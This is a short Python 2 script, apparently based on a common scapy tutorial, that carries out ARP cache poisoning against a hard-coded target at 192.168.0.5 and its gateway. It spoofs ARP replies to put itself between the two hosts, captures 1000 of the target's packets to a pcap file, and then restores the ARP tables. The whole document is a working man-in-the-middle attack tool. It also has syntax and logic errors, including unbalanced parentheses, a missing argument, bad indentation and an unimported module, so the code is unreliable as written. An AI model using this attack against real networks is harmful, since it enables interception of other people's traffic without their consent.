from scapy.all import *
import os
import sys
import threading
import signal

def get_mac(ip):
    response,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff"))/ARP(pdst=ip),timeout=2,retry=10)

    for s,r in response:
        return r[Ether].src
    return None


def restore(gateway_ip, gateway_mac, tar_ip, target_mac):
    print "restoring network!"
    send(ARP(op=2,psrc=gateway_ip,pdst=tar_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=10)
    send(ARP(op=2, psrc=tar_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=10)
    os.kill(os.getpid(),signal.SIGINT)

def poison(gw_ip,gw_mac,tar_ip,tar_mac):
    poi_tar=ARP()
    poi_tar.op=2
    poi_tar.psrc = gw_ip
    poi_tar.pdst = tar_ip
    poi_tar.hwdst = tar_mac
    poi_gw = ARP()
    poi_gw.op=2
    poi_gw.psrc=tar_ip
    poi_gw.psrc = tar_ip
    poi_gw.pdst = gw_ip
    poi_gw.hwdst=gw_mac
    print "beginning arp poisoning"

    while 1:
        try:
            send(poi_tar)
            send(poi_gw)
            time.sleep(1)
        except KeyboardInterrupt:
        restore(gw_ip,gw_mac,tar_ip,tar_mac)
        print "arp attack fined"
        return
tar_ip = "192.168.0.5"
interface = "en0"
gateway_ip = "192.168.0.1"
packet_count = 1000

conf.iface = interface
conf.verb = 0
print "setting up *s" % interface
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "Failed to get the mac address of default gateway"
    sys.exit(-1)

target_mac = get_mac(tar_ip)
if target_mac is None:
    print "failed to get mac of target ip"
    sys.exit(-1)

threads = threading.Thread(target = poison, args = gateway_mac,tar_ip,target_mac))
threads.start()

try:
    print "starting at %d packets" %packet_count
    filt = "ip host %s" %tar_ip
    packets = sniff(count=packet_count,filter=filt,iface=interface)
    wrpcap("arp.pcap",packets)
    restore(gateway_ip,gateway_mac,tar_ip,target_mac)
except KeyboardInterrupt:
    restore(gateway_ip, gateway_mac, tar_ip, target_mac)
    sys.exit(0)





